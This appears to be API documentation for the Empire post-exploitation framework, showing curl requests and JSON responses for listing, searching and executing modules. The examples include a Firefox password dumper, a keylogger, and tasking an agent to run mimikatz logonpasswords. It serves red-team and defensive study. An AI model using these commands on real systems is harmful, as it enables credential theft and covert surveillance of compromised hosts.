* [Get Current Modules](#get-current-modules)
* [Get Module by Name](#get-module-by-name)
* [Search for Module](#search-for-module)
* [Execute a Module](#execute-a-module)

## Get Current Modules

### Handler

* **Handler** : GET /api/modules
* Description : Returns all current Empire modules.
* No parameters

### Example

**Request**:
```bash
curl --insecure -i https://localhost:1337/api/modules?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
```

**Response**:
```json
{
  "modules": [
    {
      "Author": [
        "@xorrior"
      ],
      "Background": true,
      "Comments": [
        "https://github.com/xorrior/RandomPS-Scripts/blob/master/Get-FoxDump.ps1",
        "http://xakfor.net/threads/c-firefox-36-password-cookie-recovery.12192/"
      ],
      "Description": "This module will dump any saved passwords from Firefox to the console. This should work for any versionof Firefox above version 32. This will only be successful if the master password is blank or has not been set.",
      "MinPSVersion": "2",
      "Name": "collection/FoxDump",
      "NeedsAdmin": false,
      "OpsecSafe": true,
      "OutputExtension": null,
      "SaveOutput": false,
      "options": {
        "Agent": {
          "Description": "Agent to run the module on.",
          "Required": true,
          "Value": ""
        },
        "OutFile": {
          "Description": "Path to Output File",
          "Required": false,
          "Value": ""
        }
      }
    },
    ...
  ]
}
```

## Get Module by Name

### Handler

* **Handler** : GET /api/modules/MODULE_NAME
* Description : Returns the module specified by MODULE_NAME.
* No parameters

### Example

**Request**:
```bash
curl --insecure -i https://localhost:1337/api/modules/collection/keylogger?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5
```

**Response**:
```json
{
  "modules": [
    {
      "Author": [
        "@obscuresec",
        "@mattifestation",
        "@harmj0y"
      ],
      "Background": true,
      "Comments": [
        "https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1"
      ],
      "Description": "Logs keys pressed, time and the active window (when changed).",
      "MinPSVersion": "2",
      "Name": "collection/keylogger",
      "NeedsAdmin": false,
      "OpsecSafe": true,
      "OutputExtension": null,
      "options": {
        "Agent": {
          "Description": "Agent to run module on.",
          "Required": true,
          "Value": ""
        }
      }
    }
  ]
}
```

## Search for Module

### Handler

* **Handler** : POST /api/modules/search
* Description : Searches all module fields for the given term.
* Parameters (none required) :
  * term    : the term to search for (required)

### Example

**Request**:
```bash
curl --insecure -i -H "Content-Type: application/json"  https://localhost:1337/api/modules/search?token=ks23jlvdki4fj1j23w39h0h0xcuwjrqilocxd6b5 -d '{"term":"keylogger"}'
```

**Response**:
```json
{
  "modules": [
    {
      "Author": [
        "@obscuresec",
        "@mattifestation",
        "@harmj0y"
      ],
      "Background": true,
      "Comments": [
        "https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1"
      ],
      "Description": "Logs keys pressed, time and the active window (when changed).",
      "MinPSVersion": "2",
      "Name": "collection/keylogger",
      "NeedsAdmin": false,
      "OpsecSafe": true,
      "OutputExtension": null,
      "options": {
        "Agent": {
          "Description": "Agent to run module on.",
          "Required": true,
          "Value": ""
        }
      }
    }
  ]
}
```

## Execute a Module

### Handler

* **Handler** : POST /api/modules/MODULE_NAME
* Description : Tasks an 
* Parameters (none required) :
  * Agent    : the agent to task the module for (or all). Required.
  * *additional*    : any additional module values enumerated from module options

### Example

**Request**:
```bash
curl --insecure -i -H "Content-Type: application/json" https://localhost:1337/api/modules/credentials/mimikatz/logonpasswords?token=$TOKEN -X POST -d '{"Agent":"WTN1LHHRYHFWHXU3"}'

```

**Response**:
```json
{
  "msg": "tasked agent WTN1LHHRYHFWHXU3 to run module credentials/mimikatz/logonpasswords",
  "success": true
}
```